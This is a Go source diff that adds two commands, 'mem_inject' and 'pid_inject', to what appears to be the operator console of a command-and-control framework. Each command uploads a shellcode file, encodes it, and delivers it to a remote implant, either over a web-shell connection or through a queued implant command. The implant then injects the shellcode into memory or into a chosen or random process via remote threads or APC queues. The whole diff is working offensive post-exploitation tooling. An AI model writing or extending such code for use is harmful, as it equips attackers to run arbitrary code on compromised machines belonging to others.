@@ -342,4 +342,108 @@ func InitializeSessionCLI(sessionApp *grumble.App, activeSession int) {
 
 	sessionApp.AddCommand(sessionUpdateIntervalCmd)
 
+	sessionMemInject := &grumble.Command{
+		Name:     "mem_inject",
+		Help:     "delivers a shellcode payload to be injected into memory",
+		LongHelp: "delivers a shellcode payload to be injected into memory via implant defined process such as HeapAlloc or VirtualAlloc",
+		Args: func(a *grumble.Args) {
+			a.String("shellcode", "path to the file containing the shellcode string (shellcode format: aabbccddeeff)")
+		},
+		Flags: func(f *grumble.Flags) {
+			f.String("m", "method", "any", "memory injection method default is 'any' but any other custom text can be supplied here as long as the implant understands it")
+		},
+		Run: func(c *grumble.Context) error {
+
+			uploadFile := c.Args.String("shellcode")
+
+			method := c.Flags.String("method")
+
+			fileName := uploadFile
+
+			var operator string
+
+			operator = "server"
+
+			core.LogData(operator + " executed: mem_inject -m " + method + " " + uploadFile)
+
+			fileb64 := core.UploadFile(uploadFile)
+
+			if fileb64 != "" {
+				if core.Sessions[activeSession].CommandQuery != "" {
+					cmdString := "mem_inject"
+
+					session := core.Sessions[activeSession]
+
+					_, err := core.ExecuteConnection(session.Rhost, session.Rport, session.Protocol, session.ShellPath, session.CommandQuery, cmdString, session.Query, session.RequestType, method, fileb64)
+					if err != nil {
+						return err
+					}
+
+				} else {
+					cmdString := "mem_inject " + method + " " + fileb64
+					core.QueueImplantCommand(activeSession, cmdString, "server")
+				}
+
+				core.SuccessColorBold.Println("Shellcode: " + fileName + " should now be injected!")
+			}
+
+			return nil
+		},
+	}
+
+	sessionApp.AddCommand(sessionMemInject)
+
+	sessionPidInject := &grumble.Command{
+		Name:     "pid_inject",
+		Help:     "delivers a shellcode payload to a injected into a specific process memory",
+		LongHelp: "delivers a shellcode payload to a injected into a specific process memory via methods such as RemoteThread and APC Queues",
+		Args: func(a *grumble.Args) {
+			a.String("shellcode", "path to the file containing the shellcode string (shellcode format: aabbccddeeff)")
+		},
+		Flags: func(f *grumble.Flags) {
+			f.Int("p", "pid", 0, "process identifier to inject, default is '0' for a random PID")
+		},
+		Run: func(c *grumble.Context) error {
+
+			uploadFile := c.Args.String("shellcode")
+
+			pid := c.Flags.Int("pid")
+
+			pidString := strconv.Itoa(pid)
+
+			fileName := uploadFile
+
+			var operator string
+
+			operator = "server"
+
+			core.LogData(operator + " executed: pid_inject -p " + pidString + " " + uploadFile)
+
+			fileb64 := core.UploadFile(uploadFile)
+
+			if fileb64 != "" {
+				if core.Sessions[activeSession].CommandQuery != "" {
+					cmdString := "pid_inject"
+
+					session := core.Sessions[activeSession]
+
+					_, err := core.ExecuteConnection(session.Rhost, session.Rport, session.Protocol, session.ShellPath, session.CommandQuery, cmdString, session.Query, session.RequestType, pidString, fileb64)
+					if err != nil {
+						return err
+					}
+
+				} else {
+					cmdString := "pid_inject " + pidString + " " + fileb64
+					core.QueueImplantCommand(activeSession, cmdString, "server")
+				}
+
+				core.SuccessColorBold.Println("Shellcode: " + fileName + " should now be injected into PID: " + pidString + "!")
+			}
+
+			return nil
+		},
+	}
+
+	sessionApp.AddCommand(sessionPidInject)
+
 }
